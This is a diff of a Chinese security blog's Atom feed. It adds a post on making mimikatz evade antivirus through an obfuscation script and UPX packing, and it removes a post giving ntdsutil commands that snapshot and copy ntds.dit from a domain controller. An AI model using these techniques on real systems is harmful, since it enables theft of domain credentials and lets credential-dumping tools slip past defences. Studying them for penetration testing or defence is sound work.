@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://sherlocz.github.io/"/>
-  <updated>2020-09-19T17:53:25.186Z</updated>
+  <updated>2020-10-10T07:02:21.070Z</updated>
   <id>http://sherlocz.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>mimikatz简单免杀</title>
+    <link href="http://sherlocz.github.io/2020/10/10/Obfuscate-Mimikatz/"/>
+    <id>http://sherlocz.github.io/2020/10/10/Obfuscate-Mimikatz/</id>
+    <published>2020-10-10T04:43:43.000Z</published>
+    <updated>2020-10-10T07:02:21.070Z</updated>
+    
+    <content type="html"><![CDATA[<p>传送门：<a href="https://sherlocz.github.io/2020/05/20/mimikatz%E7%BC%96%E8%AF%91/" title="https://sherlocz.github.io/2020/05/20/mimikatz%E7%BC%96%E8%AF%91/">【原版mimikatz编译】</a></p><h1 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h1><p><a href="https://gist.githubusercontent.com/S3cur3Th1sSh1t/08623de0c5cc67d36d4a235cec0f5333/raw/dafbd32d1307c4ebb512e4eb7c43c7e1292bcac9/ObfuscateMimi_First.sh" title="https://gist.githubusercontent.com/S3cur3Th1sSh1t/08623de0c5cc67d36d4a235cec0f5333/raw/dafbd32d1307c4ebb512e4eb7c43c7e1292bcac9/ObfuscateMimi_First.sh" target="_blank" rel="noopener">https://gist.githubusercontent.com/S3cur3Th1sSh1t/08623de0c5cc67d36d4a235cec0f5333/raw/dafbd32d1307c4ebb512e4eb7c43c7e1292bcac9/ObfuscateMimi_First.sh</a></p><p><a href="https://github.com/upx/upx" title="https://github.com/upx/upx" target="_blank" rel="noopener">https://github.com/upx/upx</a><br>混淆-&gt;upx加壳</p><p>卡巴的每次都要重新编译，upx加壳</p><p><img src="/2020/10/10/Obfuscate-Mimikatz/kabasiji.png" alt><br><img src="/2020/10/10/Obfuscate-Mimikatz/360.png" alt><br><img src="/2020/10/10/Obfuscate-Mimikatz/huorong.png" alt><br><img src="/2020/10/10/Obfuscate-Mimikatz/symantec.png" alt></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;传送门：&lt;a href=&quot;https://sherlocz.github.io/2020/05/20/mimikatz%E7%BC%96%E8%AF%91/&quot; title=&quot;https://sherlocz.github.io/2020/05/20/mimikatz%E7%
+      
+    
+    </summary>
+    
+    
+    
+      <category term="免杀" scheme="http://sherlocz.github.io/tags/%E5%85%8D%E6%9D%80/"/>
+    
+  </entry>
   
   <entry>
     <title>kerberos协议中的票据传递攻击</title>
@@ -490,31 +514,6 @@
     
     
       <category term="汇编" scheme="http://sherlocz.github.io/tags/%E6%B1%87%E7%BC%96/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Windows下ntds.dit的利用</title>
-    <link href="http://sherlocz.github.io/2020/02/28/Windows%E4%B8%8Bntds-dit%E7%9A%84%E5%88%A9%E7%94%A8/"/>
-    <id>http://sherlocz.github.io/2020/02/28/Windows下ntds-dit的利用/</id>
-    <published>2020-02-28T12:14:10.000Z</published>
-    <updated>2020-02-28T12:40:39.121Z</updated>
-    
-    <content type="html"><![CDATA[<p>ntds.dit是windows下的一个文件，里面存放了域内机器的一些信息，但是就算是域控的账号也无法直接读取出来。这里讲讲提取的方式和读取的方式。</p><p><img src="/2020/02/28/Windows下ntds-dit的利用/n.png" alt><br>无法直接读取</p><p>记笔记记笔记~</p><h1 id="提取ntds-dit"><a href="#提取ntds-dit" class="headerlink" title="提取ntds.dit"></a>提取ntds.dit</h1><ul><li>ntdsutil.exe: Windows Server 2003/08/12</li><li>vssadmin: Windows 7/Windows Server 2008</li></ul><p>这里用12的机器做示范：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit//创建一个快照</span><br></pre></td></tr></table></figure><p>快照包含Windows中的所有文件，并且复制的时候不会影响Windows本机，也不会受到限制<br><img src="/2020/02/28/Windows下ntds-dit的利用/1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit//加载快照</span><br></pre></td></tr></table></figure><p><img src="/2020/02/28/Windows下ntds-dit的利用/2.png" alt><br>这个时候会映射出一个文件夹出来，GUID为每次生成镜像的GUID</p><p>然后用命令将ntds.dit复制出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202002282030_VOLUMEC$\windows\ntds\ntds.dit</span><br><span class="line"> c:\temp\ntds.dit</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/28/Windows下ntds-dit的利用/3.png" alt></p><p>最后删除卸载快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p><img src="/2020/02/28/Windows下ntds-dit的利用/4.png" alt></p><p>执行以下命令，若List为空，则说明卸载成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></figure></p><p><img src="/2020/02/28/Windows下ntds-dit的利用/5.png" alt></p><p>这就是ntdsutil的用法，win7下没有这个工具，需要利用vssadmin，这里没有win7域控的环境就先不搞了<br><img src="/2020/02/28/Windows下ntds-dit的利用/win7.png" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;ntds.dit是windows下的一个文件，里面存放了域内机器的一些信息，但是就算是域控的账号也无法直接读取出来。这里讲讲提取的方式和读取的方式。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/2020/02/28/Windows下ntds-dit的利用/n.png&quot; alt&gt;&lt;b
-      
-    
-    </summary>
-    
-    
-    
-      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
     
   </entry>
   
